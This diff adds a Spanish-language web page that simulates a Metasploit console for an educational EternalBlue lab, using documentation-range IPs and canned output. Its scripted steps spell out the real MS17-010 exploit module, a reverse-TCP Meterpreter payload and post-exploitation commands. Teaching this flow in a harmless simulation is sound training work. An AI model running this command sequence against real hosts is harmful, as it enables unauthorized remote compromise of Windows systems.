@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Laboratorio Metasploit (Simulado)</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#050806; --panel:#0b120d; --line:#173a22; --green:#39ff6a; --green-dim:#1f7a3d;
+  --amber:#ffb400; --red:#ff5c5c; --text:#d7ffe0; --muted:#5f8a6c;
+  box-sizing:border-box;
+  padding-top:env(safe-area-inset-top,0px);
+  padding-bottom:env(safe-area-inset-bottom,0px);
+}
+*{box-sizing:border-box;}
+html{scroll-padding-top:env(safe-area-inset-top,0px);}
+html,body{height:100%;}
+body{
+  margin:0; background:var(--bg); color:var(--text);
+  font-family:'JetBrains Mono', ui-monospace, 'Courier New', monospace;
+  display:flex; flex-direction:column; min-height:100%;
+}
+header{
+  padding:14px 18px; border-bottom:1px solid var(--line);
+  display:flex; flex-wrap:wrap; gap:10px 20px; align-items:baseline; justify-content:space-between;
+}
+header h1{font-size:14px; margin:0; letter-spacing:.5px; color:var(--green); font-weight:700;}
+header .warn{font-size:11px; color:var(--amber); max-width:520px; line-height:1.5;}
+main{
+  flex:1; display:flex; gap:16px; padding:16px; max-width:1100px; margin:0 auto; width:100%;
+}
+#objectives{
+  width:230px; flex-shrink:0; border:1px solid var(--line); border-radius:4px; padding:12px;
+  font-size:12px; height:fit-content; position:sticky; top:16px;
+}
+#objectives h2{font-size:11px; color:var(--muted); margin:0 0 10px; font-weight:500;}
+#objectives ol{margin:0; padding-left:18px; line-height:2;}
+#objectives li{color:var(--muted); transition:color .2s;}
+#objectives li.done{color:var(--green);}
+#objectives li.current{color:var(--text); font-weight:700;}
+#objectives li.done::marker{color:var(--green-dim);}
+#termwrap{
+  flex:1; min-width:0; border:1px solid var(--line); border-radius:4px; background:var(--panel);
+  display:flex; flex-direction:column; overflow:hidden;
+}
+#termbar{
+  padding:8px 12px; border-bottom:1px solid var(--line); font-size:11px; color:var(--muted);
+  display:flex; justify-content:space-between; gap:10px;
+}
+#termbar button{
+  background:none; border:1px solid var(--line); color:var(--muted); font-family:inherit;
+  font-size:11px; padding:3px 8px; border-radius:3px; cursor:pointer;
+}
+#termbar button:hover{color:var(--green); border-color:var(--green-dim);}
+#log{
+  flex:1; overflow-y:auto; padding:14px; font-size:13px; line-height:1.65; white-space:pre-wrap; word-break:break-word;
+}
+#log .cmdline{color:var(--text);}
+#log .cmdline .prompt{color:var(--green); font-weight:700;}
+#log .out{color:var(--muted);}
+#log .ok{color:var(--green);}
+#log .warnline{color:var(--amber);}
+#log .err{color:var(--red);}
+#inputrow{
+  display:flex; align-items:center; gap:8px; padding:10px 14px; border-top:1px solid var(--line);
+}
+#inputrow .prompt{color:var(--green); font-weight:700; font-size:13px; white-space:nowrap;}
+#cmdin{
+  flex:1; background:none; border:none; outline:none; color:var(--text); font-family:inherit; font-size:13px;
+}
+#log::-webkit-scrollbar{width:8px;} #log::-webkit-scrollbar-thumb{background:var(--line); border-radius:4px;}
+@media (max-width:720px){
+  main{flex-direction:column;}
+  #objectives{width:auto; position:static;}
+}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>msf-lab :: consola simulada</h1>
+  <div class="warn">Simulación educativa. No es Metasploit real, no se ejecuta ni envía nada. El host 192.0.2.10 es una IP de documentación (RFC 5737), no existe en internet.</div>
+</header>
+
+<main>
+  <div id="objectives">
+    <h2>OBJETIVOS DEL LAB</h2>
+    <ol id="objlist"></ol>
+  </div>
+
+  <div id="termwrap">
+    <div id="termbar">
+      <span>msf6 &gt; laboratorio EternalBlue (simulado)</span>
+      <button id="hintBtn">pista</button>
+      <button id="resetBtn">reiniciar</button>
+    </div>
+    <div id="log"></div>
+    <div id="inputrow">
+      <span class="prompt" id="livePrompt">msf6 &gt;</span>
+      <input id="cmdin" type="text" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="escribe un comando y pulsa Enter">
+    </div>
+  </div>
+</main>
+
+<script>
+const logEl = document.getElementById('log');
+const input = document.getElementById('cmdin');
+const promptEl = document.getElementById('livePrompt');
+const objlist = document.getElementById('objlist');
+
+function prompt(){
+  return state.stage==='meter' ? 'meterpreter >' :
+         state.stage==='module' ? 'msf6 exploit(ms17_010_eternalblue) >' : 'msf6 >';
+}
+
+function print(text, cls){
+  const d = document.createElement('div');
+  d.className = cls||'out';
+  d.textContent = text;
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function printCmd(text){
+  const d = document.createElement('div');
+  d.className = 'cmdline';
+  d.innerHTML = '<span class="prompt">'+prompt()+'</span> '+text.replace(/</g,'&lt;');
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+// ---- lab script: ordered steps ----
+const steps = [
+  { label:'Buscar el módulo EternalBlue', stage:'root',
+    match:s=>/^search\s+eternalblue$/.test(s),
+    run:()=>{
+      print('Matching Modules', 'ok');
+      print('================\n\n   #  Name                                          Disclosure Date  Rank     Check  Description');
+      print('   -  ----                                          ---------------  ----     -----  -----------');
+      print('   0  exploit/windows/smb/ms17_010_eternalblue      2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption');
+    }},
+  { label:'Seleccionar el exploit', stage:'root', next:'module',
+    match:s=>/^use\s+(0|exploit\/windows\/smb\/ms17_010_eternalblue)$/.test(s),
+    run:()=>{ print('[*] Módulo cargado.', 'ok'); }},
+  { label:'Fijar RHOSTS = 192.0.2.10', stage:'module',
+    match:s=>/^set\s+rhosts?\s+192\.0\.2\.10$/.test(s),
+    run:()=>{ print('RHOSTS => 192.0.2.10', 'ok'); }},
+  { label:'Fijar LHOST = 192.0.2.50', stage:'module',
+    match:s=>/^set\s+lhost\s+192\.0\.2\.50$/.test(s),
+    run:()=>{ print('LHOST => 192.0.2.50', 'ok'); }},
+  { label:'Configurar el payload', stage:'module',
+    match:s=>/^set\s+payload\s+windows\/x64\/meterpreter\/reverse_tcp$/.test(s),
+    run:()=>{ print('PAYLOAD => windows/x64/meterpreter/reverse_tcp', 'ok'); }},
+  { label:'Lanzar el exploit', stage:'module', next:'meter',
+    match:s=>/^(exploit|run)$/.test(s),
+    run:()=>{
+      print('[*] Started reverse TCP handler on 192.0.2.50:4444', 'out');
+      print('[*] 192.0.2.10:445 - Detectando arquitectura del objetivo simulado...', 'out');
+      print('[*] 192.0.2.10:445 - Target OS: Windows Server 2016 Standard 14393 x64 (build:14393)', 'out');
+      print('[*] 192.0.2.10:445 - Preparando exploit contra el objetivo simulado...', 'out');
+      print('[+] 192.0.2.10:445 - Conexión establecida (simulada).', 'ok');
+      print('[*] Sending stage (200262 bytes) to 192.0.2.10', 'out');
+      print('[*] Meterpreter session 1 opened (192.0.2.50:4444 -> 192.0.2.10:49412)', 'ok');
+    }},
+  { label:'Consultar el usuario de la sesión', stage:'meter',
+    match:s=>/^getuid$/.test(s),
+    run:()=>{ print('Server username: NT AUTHORITY\\SYSTEM', 'ok'); }},
+  { label:'Recoger información del sistema', stage:'meter',
+    match:s=>/^sysinfo$/.test(s),
+    run:()=>{
+      print('Computer        : LAB-WIN2016');
+      print('OS              : Windows Server 2016 (10.0 Build 14393)');
+      print('Architecture    : x64');
+      print('System Language : es_ES');
+      print('Meterpreter     : x64/windows');
+    }},
+  { label:'Cerrar la sesión de forma limpia', stage:'meter',
+    match:s=>/^(exit|background|bg)$/.test(s),
+    run:()=>{
+      print('[*] Sesión 1 finalizada.', 'ok');
+      print('\n== LAB COMPLETADO ==', 'ok');
+      print('Repasaste el flujo: reconocimiento -> selección de exploit -> configuración -> explotación -> post-explotación.', 'out');
+    }}
+];
+
+let state = { i:0, stage:'root' };
+
+const helpText = {
+  root:  'Comandos disponibles: search eternalblue | use exploit/windows/smb/ms17_010_eternalblue',
+  module:'Comandos disponibles: set RHOSTS <ip> | set LHOST <ip> | set PAYLOAD <ruta> | exploit',
+  meter: 'Comandos disponibles: getuid | sysinfo | exit'
+};
+
+function renderObjectives(){
+  objlist.innerHTML = '';
+  steps.forEach((st,idx)=>{
+    const li = document.createElement('li');
+    li.textContent = st.label;
+    if(idx < state.i) li.className = 'done';
+    else if(idx === state.i) li.className = 'current';
+    objlist.appendChild(li);
+  });
+}
+
+function currentStep(){ return steps[state.i]; }
+
+function handle(raw){
+  const s = raw.trim().toLowerCase().replace(/\s+/g,' ');
+  printCmd(raw);
+  if(!s) return;
+
+  if(s === 'help'){ print(helpText[state.stage], 'out'); return; }
+  if(s === 'clear'){ logEl.innerHTML=''; return; }
+  if(s === 'reset'){ resetLab(); return; }
+
+  const step = currentStep();
+  if(!step){ print('[*] El laboratorio ya está completo. Escribe "reset" para repetirlo.', 'out'); return; }
+
+  if(step.match(s)){
+    step.run();
+    if(step.next) state.stage = step.next;
+    state.i++;
+    promptEl.textContent = prompt();
+    renderObjectives();
+    if(state.i >= steps.length){
+      print('\n[!] Escribe "reset" si quieres repetir el laboratorio desde el principio.', 'warnline');
+    }
+  } else {
+    print('[-] Comando no reconocido en este paso del laboratorio.', 'err');
+    print('    Escribe "help" para ver los comandos válidos aquí, o "pista" / el botón de pistas.', 'out');
+  }
+}
+
+function giveHint(){
+  const step = currentStep();
+  if(!step){ print('[*] No quedan pasos pendientes.', 'out'); return; }
+  print('[hint] Siguiente objetivo: ' + step.label, 'warnline');
+}
+
+function resetLab(){
+  state = { i:0, stage:'root' };
+  logEl.innerHTML = '';
+  promptEl.textContent = prompt();
+  print('Metasploit Framework simulado — laboratorio EternalBlue', 'ok');
+  print('Objetivo ficticio: 192.0.2.10 (RFC 5737, no enrutable). Escribe "help" en cualquier momento.\n', 'out');
+  renderObjectives();
+}
+
+input.addEventListener('keydown', e=>{
+  if(e.key === 'Enter' && input.value.length){
+    handle(input.value);
+    input.value = '';
+  }
+});
+document.getElementById('hintBtn').addEventListener('click', giveHint);
+document.getElementById('resetBtn').addEventListener('click', resetLab);
+document.body.addEventListener('click', ()=>input.focus());
+
+resetLab();
+input.focus();
+</script>
+</body>
+</html>
